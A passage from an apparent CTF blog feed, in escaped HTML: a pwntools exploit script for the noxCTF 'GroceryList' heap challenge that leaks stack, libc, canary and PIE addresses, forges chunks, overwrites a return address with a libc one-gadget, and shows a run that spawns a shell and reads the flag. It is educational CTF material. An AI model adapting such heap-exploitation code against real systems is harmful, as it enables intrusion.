    gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(r, gdbcmd&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x555555554000&lt;/span&gt;))
    &lt;span style=&#34;color:#75715e&#34;&gt;# r = process(sys.argv[1])&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;dump_all&lt;/span&gt;():
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7. Exit&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;----------&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    content &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;----------&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, drop&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;True)
    content &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; content&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;splitlines()
    content &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;. &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; content]
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; content

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;add_item&lt;/span&gt;(size, payload):
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7. Exit&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;items?&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, str(size))
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;name:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, payload)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;add_empty&lt;/span&gt;(size, count):
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7. Exit&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;items?&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, str(size))
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;add?&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, str(count))

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;remove_item&lt;/span&gt;(ID):
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7. Exit&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;remove?&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, str(ID))

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;edit_item&lt;/span&gt;(ID, payload):
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7. Exit&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;edit?&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, str(ID))
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;name:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, payload)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;add_default&lt;/span&gt;():
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7. Exit&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_exit&lt;/span&gt;():
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7. Exit&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)

add_default()
stack &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; u64(dump_all()[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;))
log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;stack &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; hex(stack))
remove_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)

add_empty(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
remove_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
remove_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
payload  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x21&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x21&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(stack &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1b&lt;/span&gt;)
edit_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, payload)
add_empty(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)

libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; u64(dump_all()[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20830&lt;/span&gt;
log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;libc &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; hex(libc))

remove_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
remove_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
remove_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)

payload  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(libc &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20830&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4100&lt;/span&gt;)
edit_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, payload)

add_empty(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
remove_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
remove_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
payload  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x41&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x41&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(stack &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
edit_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, payload)
add_empty(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)

remove_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
remove_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
remove_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)

canary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; u64(dump_all()[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][:&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rjust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;))
pie &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; u64(dump_all()[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;:]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1380&lt;/span&gt;
log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;canary &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; hex(canary))
log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;pie &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; hex(pie))

add_empty(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
remove_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
remove_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
payload  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x71&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x71&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(pie &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20202d&lt;/span&gt;)
edit_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, payload)
add_empty(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)

remove_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# gdb.attach(r, gdbcmd.format(pie))&lt;/span&gt;
remove_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
remove_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)

payload  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(libc &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x45216&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(canary)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(pie &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1380&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(libc &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x45216&lt;/span&gt;)
edit_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, payload)

payload  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(stack &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xb&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(stack &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(pie &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20203d&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(libc &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x45216&lt;/span&gt;)
edit_item(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, payload)

_exit()
r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;flag&#34;&gt;flag&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;λ › python solve.py chal.noxale.com 1232
[+] Opening connection to chal.noxale.com on port 1232: Done
[*] stack 0x7ffec128fb3b
[*] libc 0x7fdf29bb9000
[*] canary 0xedc677284751c5
[*] pie 0x55a4c8cd3000
[*] Switching to interactive mode

Goodbye

$ ls
GroceryList
flag
$ cat flag
noxCTF{I_L0ve_F0rg1ng_Chunk5}
$ 
[*] Closed connection to chal.noxale.com port 1232
&lt;/code&gt;&lt;/pre&gt;</description>
       </item>
       
       <item>
         <title>HackToday 2018 - faile</title>
         <link>http://kiror0.github.io/ctf/posts/hacktoday-2018-faile/</link>
         <pubDate>Mon, 03 Sep 2018 22:16:58 +0000</pubDate>
         
         <guid>http://kiror0.github.io/ctf/posts/hacktoday-2018-faile/</guid>
         <description>&lt;blockquote&gt;
